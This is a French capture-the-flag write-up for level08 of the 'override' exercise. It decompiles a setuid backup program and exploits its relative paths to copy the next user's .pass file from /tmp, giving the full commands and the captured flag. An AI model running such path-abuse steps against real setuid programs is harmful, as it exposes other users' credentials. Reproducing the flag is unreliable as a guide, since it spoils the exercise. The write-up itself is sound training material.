# override: [level08]

Observations:
---

#### Détails du profil:
```md
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
```

#### Détails du programme:
```sh
-rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08
```

#### Programme décompilé:
```c
//----- (00000000004008C4) ----------------------------------------------------
unsigned __int64 __fastcall log_wrapper(FILE *a1, const char *a2, const char *a3)
{
  char dest[264];
  unsigned __int64 v6;

  v6 = __readfsqword(0x28u);
  strcpy(dest, a2);
  snprintf(&dest[strlen(dest)], 254 - strlen(dest), a3);
  dest[strcspn(dest, "\n")] = 0;
  fprintf(a1, "LOG: %s\n", dest);
  return __readfsqword(0x28u) ^ v6;
}

//----- (00000000004009F0) ----------------------------------------------------
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *v4;
  FILE *stream;
  int fd;
  char buf;
  char dest[104];
  unsigned __int64 v9;

  v9 = __readfsqword(0x28u);
  buf = -1;
  if ( argc != 2 )
    printf("Usage: %s filename\n", *argv);
  v4 = fopen("./backups/.log", "w");
  if ( !v4 )
  {
    printf("ERROR: Failed to open %s\n", "./backups/.log");
    exit(1);
  }
  log_wrapper(v4, "Starting back up: ", argv[1]);
  stream = fopen(argv[1], "r");
  if ( !stream )
  {
    printf("ERROR: Failed to open %s\n", argv[1]);
    exit(1);
  }
  
  strcpy(dest, "./backups/");
  strncat(dest, argv[1], 99 - strlen(dest));
  fd = open(dest, 193, 432LL);
  if ( fd < 0 )
  {
    printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]);
    exit(1);
  }
  while ( 1 )
  {
    buf = fgetc(stream);
    if ( buf == -1 )
      break;
    write(fd, &buf, 1uLL);
  }
  log_wrapper(v4, "Finished back up ", argv[1]);
  fclose(stream);
  close(fd);
  return 0;
}
```

#### Entrée programme:

| Nom | Description |
| --- | ----------- |
| `argv[1]`			| Chaîne de caractères. |

#### Fonctions:

| Nom | Description |
| --- | ----------- |
| `<main>`			| Cette fonction ouvre un fichier au chemin `"./backups/.log"` en mode écriture puis écrit dans ce dernier `"Starting back up: "` suivit du contenu de `argv[1]`. <br> Ensuite elle ouvre le fichier au chemin contenu dans `argv[1]` en mode lecture. <br> Après cela elle ouvre le fichier contenu à `"./backups/"` + `argv[1]` en mode ecriture, concatenation, et creation. <br> Ensuite chacun des caractères dans le fichier au chemin `argv[1]` sont copiés dans le fichier au chemin `"./backups/"` + `argv[1]`. |
| `<log_wrapper>`	| Écris un message concatenant deux chaînes de caractères dans un fichier. |


#### Conclusions:
Tous les chemins sont relatifs, en changeant le chemin d'exécution du programme nous pouvons changer le chemin de toutes les lectures et écriture de fichiers.

----
Résolution:
----
Nous créons un dossier au chemin `/tmp/backups/home/users/level09/`, puis un dossier vide libre de droit au chemin `/tmp/backups/.log`. \
Ensuite nous exécutons le fichier `/home/users/level08/level08` à la racine `/tmp` avec comme paramètre `/home/users/level09/.pass`. \
Vu que le fichier à `/tmp/backups//home/users/level09/.pass` n'existe pas, le  programme va le créer avec les droit d'utilisateur de l'exécutable. \
De ce fait il aura donc les droit d'écrire dedans, et il vas écrire le contenu du fichier au chemin `/home/users/level09/.pass`.
Il ne nous reste plus qu'a afficher le contenu du fichier `backups/home/users/level09/.pass`.

#### Commandes:
```bash
~$ cd /tmp
/tmp$ mkdir -p backups/home/users/level09/
/tmp$ echo > backups/.log
/tmp$ chmod 777 backups/.log
/tmp$ /home/users/level08/level08 /home/users/level09/.pass
/tmp$ cat backups/home/users/level09/.pass
```

#### Flag: `fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S`
